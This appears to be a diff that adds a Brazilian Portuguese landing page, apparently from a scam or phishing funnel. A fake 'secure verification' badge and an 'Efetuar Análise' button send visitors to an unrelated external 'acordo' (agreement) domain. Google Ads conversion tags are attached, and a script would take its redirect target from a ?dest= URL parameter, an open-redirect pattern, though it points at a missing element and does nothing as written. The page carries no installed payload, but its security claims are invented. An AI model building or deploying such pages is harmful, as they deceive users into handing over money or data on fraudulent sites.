@@ -1,0 +1,207 @@
+<html lang="pt-BR"><head>
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Iniciar Análise — Verificação Segura</title>
+  <meta name="description" content="Clique no botão para iniciar sua análise. Página com verificação segura e botão de ação.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&amp;display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f0f5 0%, #e8dce8 50%, #f5f0f5 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .container {
+            width: 100%;
+            margin-top: 10rem;
+            max-width: 42rem;
+            background: white;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            padding: 3rem 2rem;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .security-badge svg {
+            color: #16a34a;
+        }
+
+        .security-badge span {
+            color: #16a34a;
+            font-weight: 600;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 2rem;
+            background: linear-gradient(to right, #3b82f6, #60a5fa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .image-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .image-container img {
+            border-radius: 1rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 28rem;
+            height: 16rem;
+            object-fit: cover;
+        }
+
+        .help-text {
+            text-align: center;
+            color: #6b7280;
+            margin-bottom: 2rem;
+        }
+
+        .cta-button {
+            width: 100%;
+            background: linear-gradient(to right, #e91e8c, #ec4899);
+            color: white;
+            font-size: 1.125rem;
+            font-weight: 600;
+            padding: 1.5rem;
+            border: none;
+            border-radius: 9999px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .cta-button:hover {
+            background: linear-gradient(to right, #ec4899, #e91e8c);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+            transform: scale(1.02);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-top: 2rem;
+            font-size: 0.875rem;
+        }
+
+        .footer-links a {
+            color: #6b7280;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #e91e8c;
+        }
+
+        .footer-links .separator {
+            color: #d1d5db;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                padding: 3rem;
+            }
+            
+            h1 {
+                font-size: 2.25rem;
+            }
+        }
+    </style>
+<script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/17421422954/?random=1763321619696&amp;cv=11&amp;fst=1763321619696&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45je5bd0h2v9235061318z89235058627za204zb9235058627zd9235058627xec&amp;gcd=13l3l3l3l1l1&amp;dma=0&amp;tag_exp=103116026~103200004~104527907~104528501~104684208~104684211~115583767~115616985~115938465~115938468~116194002~116217636~116217638&amp;u_w=1536&amp;u_h=864&amp;url=https%3A%2F%2Fagencia-orientacao-central-br.online%2F&amp;frm=0&amp;tiba=Iniciar%20An%C3%A1lise%20%E2%80%94%20Verifica%C3%A7%C3%A3o%20Segura&amp;hn=www.googleadservices.com&amp;npa=0&amp;pscdl=noapi&amp;auid=1926579182.1763321619&amp;uaa=x86&amp;uab=64&amp;uafvl=Google%2520Chrome%3B141.0.7390.123%7CNot%253FA_Brand%3B8.0.0.0%7CChromium%3B141.0.7390.123&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;_tu=BA&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"></script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/17421422954/?random=1763321619712&amp;cv=11&amp;fst=1763321619712&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45je5bd0h2v9235061318z89235058627za204zb9235058627zd9235058627xea&amp;gcd=13l3l3l3l1l1&amp;dma=0&amp;tag_exp=103116026~103200004~104527907~104528501~104684208~104684211~115583767~115616985~115938465~115938468~116194002~116217636~116217638&amp;u_w=1536&amp;u_h=864&amp;url=https%3A%2F%2Fagencia-orientacao-central-br.online%2F&amp;frm=0&amp;tiba=Iniciar%20An%C3%A1lise%20%E2%80%94%20Verifica%C3%A7%C3%A3o%20Segura&amp;hn=www.googleadservices.com&amp;npa=0&amp;pscdl=noapi&amp;auid=1926579182.1763321619&amp;uaa=x86&amp;uab=64&amp;uafvl=Google%2520Chrome%3B141.0.7390.123%7CNot%253FA_Brand%3B8.0.0.0%7CChromium%3B141.0.7390.123&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;_tu=DA&amp;rfmt=3&amp;fmt=4"></script></head>
+<body cz-shortcut-listen="true">
+    <div class="container">
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            </svg>
+            <span>Verificação segura</span>
+        </div>
+
+        <!-- Main Heading -->
+        <h1>Clique no botão para iniciar sua análise!</h1>
+
+        <!-- Customer Service Image -->
+        <div class="image-container">
+            <img src="download.jpg" alt="Atendimento">
+        </div>
+
+        <!-- Help Text -->
+        <p class="help-text">
+            Tem alguma dúvida? Clique abaixo para iniciar o atendimento.
+        </p>
+
+        <!-- CTA Button -->
+        <button class="cta-button" onclick="site()" id="960241db-7b2c-8743-d5d5-965f31d73b75">
+            Efetuar Análise
+        </button>
+
+        <!-- Footer Links -->
+        <div class="footer-links">
+            <a href="#" id="a7c2f650-7b56-3bfe-4d97-9adf41b18764">Política de Privacidade</a>
+            <span class="separator">|</span>
+            <a href="#" id="7ca288b2-d1aa-1fde-a009-b3c36cc2aa6d">Termos de Uso</a>
+        </div>
+    </div>
+
+     <script>
+     function site() {
+           window.location.href = "https://www.minha-cons-br.pro/acordo/inicio.html";
+        }
+  </script>
+
+  <script>
+    // Também é possível passar o destino via ?dest= na URL (index.html?dest=https://seulink.com)
+    (function () {
+      const p = new URLSearchParams(location.search);
+      const d = p.get('dest');
+      if (d) {
+        const a = document.getElementById('btn-analise');
+        try { a.href = decodeURIComponent(d) } catch { a.href = d }
+      }
+    })();
+  </script>
+
+</body></html>
